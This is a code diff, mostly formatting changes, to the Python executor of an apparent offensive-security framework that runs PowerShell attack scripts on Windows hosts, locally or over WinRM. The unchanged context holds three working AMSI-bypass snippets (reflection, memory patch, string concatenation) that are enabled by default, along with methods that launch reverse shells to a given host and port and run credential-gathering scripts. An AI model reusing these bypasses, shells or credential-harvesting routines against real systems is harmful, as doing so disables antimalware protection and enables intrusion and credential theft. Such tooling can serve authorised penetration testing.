@@ -18,27 +18,17 @@ Usage:
     )
 """
 
-import asyncio
 import logging
-from dataclasses import dataclass, field
 from datetime import datetime, timezone
 from pathlib import Path
-from typing import Dict, List, Any, Optional
+from typing import Any, Dict, List, Optional
 
+from aipt_v2.tools.ps_arsenal.ps_config import PSArsenalConfig, PSLoadMode
+from aipt_v2.tools.ps_arsenal.ps_metadata import get_script_metadata
 from aipt_v2.tools.winpwn.powershell_executor import (
     PowerShellExecutor,
     PowerShellResult,
-    WinRMExecutor
-)
-from aipt_v2.tools.ps_arsenal.ps_config import (
-    PSArsenalConfig,
-    PSLoadMode,
-    PSCredentials
-)
-from aipt_v2.tools.ps_arsenal.ps_metadata import (
-    get_script_metadata,
-    ScriptMetadata,
-    OutputType
+    WinRMExecutor,
 )
 
 logger = logging.getLogger(__name__)
@@ -49,7 +39,7 @@ logger = logging.getLogger(__name__)
 # =============================================================================
 
 AMSI_BYPASS_TECHNIQUES = {
-    "reflection": '''
+    "reflection": """
 # AMSI bypass - reflection technique
 try {
     $a = [Ref].Assembly.GetTypes() | ? {$_.Name -like "*iUtils"}
@@ -58,9 +48,8 @@ try {
     [Int32[]]$buf = @(0)
     [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
 } catch {}
-''',
-
-    "memory_patch": '''
+""",
+    "memory_patch": """
 # AMSI bypass - memory patch technique
 try {
     $Win32 = @"
@@ -83,9 +72,8 @@ public class Win32 {
     $Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
     [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
 } catch {}
-''',
-
-    "string_concat": '''
+""",
+    "string_concat": """
 # AMSI bypass - string concatenation technique
 try {
     $a = 'System.Management.Automation.A';$b = 'msiUtils'
@@ -93,7 +81,7 @@ try {
     $d = $c.GetField('amsiInitFailed','NonPublic,Static')
     $d.SetValue($null,$true)
 } catch {}
-''',
+""",
 }
 
 
@@ -101,34 +89,41 @@ try {
 # CUSTOM EXCEPTIONS
 # =============================================================================
 
+
 class PSExecutionError(Exception):
     """Base exception for PowerShell execution errors."""
+
     pass
 
 
 class ScriptNotFoundError(PSExecutionError):
     """Script file not found."""
+
     pass
 
 
 class AMSIBlockedError(PSExecutionError):
     """Script blocked by AMSI."""
+
     pass
 
 
 class PrivilegeError(PSExecutionError):
     """Insufficient privileges."""
+
     pass
 
 
 class WinRMConnectionError(PSExecutionError):
     """WinRM connection failed."""
+
     pass
 
 
 # =============================================================================
 # POWERSHELL ARSENAL EXECUTOR
 # =============================================================================
+
 
 class PSArsenalExecutor:
     """
@@ -150,7 +145,7 @@ class PSArsenalExecutor:
         bypass_amsi: bool = True,
         amsi_technique: str = "reflection",
         winrm_executor: Optional[WinRMExecutor] = None,
-        config: Optional[PSArsenalConfig] = None
+        config: Optional[PSArsenalConfig] = None,
     ):
         """
         Initialize PowerShell Arsenal executor.
@@ -178,10 +173,7 @@ class PSArsenalExecutor:
             self.amsi_technique = amsi_technique
 
         self.winrm_executor = winrm_executor
-        self._ps_executor = PowerShellExecutor(
-            use_pwsh_core=False,
-            execution_policy="Bypass"
-        )
+        self._ps_executor = PowerShellExecutor(use_pwsh_core=False, execution_policy="Bypass")
         self._loaded_scripts: Dict[str, str] = {}
         self._execution_history: List[Dict[str, Any]] = []
 
@@ -227,9 +219,7 @@ class PSArsenalExecutor:
         return AMSI_BYPASS_TECHNIQUES.get(tech, AMSI_BYPASS_TECHNIQUES["reflection"])
 
     def _build_function_call(
-        self,
-        function_name: str,
-        parameters: Optional[Dict[str, Any]] = None
+        self, function_name: str, parameters: Optional[Dict[str, Any]] = None
     ) -> str:
         """Build PowerShell function call with parameters."""
         if not parameters:
@@ -264,7 +254,7 @@ class PSArsenalExecutor:
         function_name: str,
         parameters: Optional[Dict[str, Any]] = None,
         timeout: int = 300,
-        env: Optional[Dict[str, str]] = None
+        env: Optional[Dict[str, str]] = None,
     ) -> PowerShellResult:
         """
         Execute a PowerShell script function.
@@ -301,7 +291,7 @@ class PSArsenalExecutor:
                 stderr=str(e),
                 execution_time=0,
                 command="",
-                metadata={"error": "script_not_found"}
+                metadata={"error": "script_not_found"},
             )
 
         # Build function call with parameters
@@ -314,47 +304,38 @@ class PSArsenalExecutor:
         if self.winrm_executor:
             result = await self.winrm_executor.execute_command(command, timeout=timeout)
         else:
-            result = await self._ps_executor.execute_command(
-                command,
-                timeout=timeout,
-                env=env
-            )
+            result = await self._ps_executor.execute_command(command, timeout=timeout, env=env)
 
         # Check for AMSI block
         amsi_indicators = [
             "This script contains malicious content",
             "AMSI blocked",
-            "ScriptContainedMaliciousContent"
+            "ScriptContainedMaliciousContent",
         ]
         if any(ind in result.stderr for ind in amsi_indicators):
             result.metadata["amsi_blocked"] = True
 
         # Check for privilege errors
-        priv_indicators = [
-            "Access is denied",
-            "requires elevation",
-            "Administrator privileges"
-        ]
+        priv_indicators = ["Access is denied", "requires elevation", "Administrator privileges"]
         if any(ind in result.stderr for ind in priv_indicators):
             result.metadata["privilege_error"] = True
 
         # Record execution
-        self._execution_history.append({
-            "timestamp": start_time.isoformat(),
-            "category": category,
-            "script": script_name,
-            "function": function_name,
-            "success": result.success,
-            "execution_time": result.execution_time
-        })
+        self._execution_history.append(
+            {
+                "timestamp": start_time.isoformat(),
+                "category": category,
+                "script": script_name,
+                "function": function_name,
+                "success": result.success,
+                "execution_time": result.execution_time,
+            }
+        )
 
         return result
 
     async def execute_by_name(
-        self,
-        script_name: str,
-        parameters: Optional[Dict[str, Any]] = None,
-        timeout: int = 300
+        self, script_name: str, parameters: Optional[Dict[str, Any]] = None, timeout: int = 300
     ) -> PowerShellResult:
         """
         Execute a script by name using metadata lookup.
@@ -375,7 +356,7 @@ class PSArsenalExecutor:
                 stdout="",
                 stderr=f"Unknown script: {script_name}",
                 execution_time=0,
-                command=""
+                command="",
             )
 
         return await self.execute_script(
@@ -383,16 +364,11 @@ class PSArsenalExecutor:
             script_name=metadata.name,
             function_name=metadata.function_name,
             parameters=parameters,
-            timeout=timeout
+            timeout=timeout,
         )
 
     async def execute_shell(
-        self,
-        shell_type: str,
-        lhost: str,
-        lport: int,
-        reverse: bool = True,
-        timeout: int = 60
+        self, shell_type: str, lhost: str, lport: int, reverse: bool = True, timeout: int = 60
     ) -> PowerShellResult:
         """
         Execute a PowerShell shell script.
@@ -425,7 +401,7 @@ class PSArsenalExecutor:
                 stdout="",
                 stderr=f"Unknown shell type: {shell_type}. Valid: {', '.join(shell_map.keys())}",
                 execution_time=0,
-                command=""
+                command="",
             )
 
         category, script_name, function_name = shell_map[shell_lower]
@@ -460,14 +436,11 @@ class PSArsenalExecutor:
             params["IPAddress"] = lhost
 
         return await self.execute_script(
-            category, script_name, function_name,
-            parameters=params, timeout=timeout
+            category, script_name, function_name, parameters=params, timeout=timeout
         )
 
     async def gather_credentials(
-        self,
-        scripts: Optional[List[str]] = None,
-        timeout: int = 300
+        self, scripts: Optional[List[str]] = None, timeout: int = 300
     ) -> Dict[str, PowerShellResult]:
         """
         Run credential gathering scripts.
@@ -549,7 +522,7 @@ def create_executor_from_config(config: PSArsenalConfig) -> PSArsenalExecutor:
             password=config.credentials.password,
             domain=config.credentials.domain,
             ssl=config.winrm_ssl,
-            port=config.winrm_port
+            port=config.winrm_port,
         )
 
     return PSArsenalExecutor(
@@ -558,7 +531,7 @@ def create_executor_from_config(config: PSArsenalConfig) -> PSArsenalExecutor:
         load_mode=config.load_mode,
         bypass_amsi=config.bypass_amsi,
         amsi_technique=config.amsi_technique,
-        winrm_executor=winrm
+        winrm_executor=winrm,
     )
 
 
